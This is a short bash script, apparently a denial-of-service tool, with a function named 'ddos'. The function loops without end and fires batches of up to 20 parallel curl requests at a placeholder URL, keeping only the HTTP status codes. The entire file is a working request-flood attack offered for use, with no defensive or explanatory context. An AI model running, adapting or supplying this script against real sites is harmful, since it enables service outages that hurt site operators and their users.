#!/bin/bash
LIMITATOR=20

function ddos(){
curl -kls "http://site/" -w %{http_code} -o /dev/null
}

while :
do
((cthread=cthread%LIMITATOR)); ((cthread++==0)) && wait
	ddos &
done
wait
